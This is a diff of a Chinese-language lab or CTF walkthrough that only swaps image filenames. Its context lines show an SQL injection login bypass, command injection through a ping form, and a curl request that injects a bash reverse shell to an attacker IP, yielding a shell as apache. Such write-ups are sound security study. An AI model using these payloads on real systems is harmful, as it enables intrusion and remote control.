@@ -98,19 +98,19 @@ Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
 
 这里可以看到80端口运行着一个Apache服务，先去访问一下它发现是一个登入界面
 
-<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
 
 通过端口扫描结果中可以看到有一个mysql的服务，所里这里尝试使用SQL注入,使用payload ' or '1'='1 密码框也是输入这个payload
 
-<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
 点击登录，成功跳转到一个web控制台，可以ping它们的主机
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 这里我ping一下我的kali主机 IP地址是192.168.43.24
 
-<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
 输出结果
 
@@ -130,11 +130,11 @@ rtt min/avg/max/mdev = 1.029/1.662/2.754/0.776 ms, pipe 2
 
 看起来应用程序只是在后端调用系统 ping 命令。 我们可以尝试一些命令注入。 让我们给应用程序一个分号，后跟一个常见的 Linux 命令，而不是 IP，看看它给我们的输出是什么。 我将使用 ;ls 作为输入。
 
-<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
 
 ls命令成功执行，使用cat命令查看一下pingit.php这个文件
 
-<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 > \
 > 这段代码是一段简单的 PHP 代码，用于执行命令行中的 `ping` 命令，并将结果输出到页面上。
@@ -162,7 +162,7 @@ Firefox 中的开发人员工具包含一项功能，允许您复制代表浏览
 
 选择copy as curl
 
-<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
 
 将这这段命令粘贴到终端，太长了，可以看到 --data-raw 的IP字段的参数可以用来命令执行，我们可以生成一个反向shell，下面是一个生成反向shell的一个网站
 
@@ -182,7 +182,7 @@ bash -i >& /dev/tcp/192.168.43.23/8888 0>&1
 └─# curl 'http://192.168.43.90/pingit.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.43.90/index.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.43.90' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'ip=%3Bbash -i >%26 /dev/tcp/192.168.43.23/8888 0>%261&submit=submit'll
 ```
 
-<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
 
 监听端口返回了一个名为apache的普通用户
 
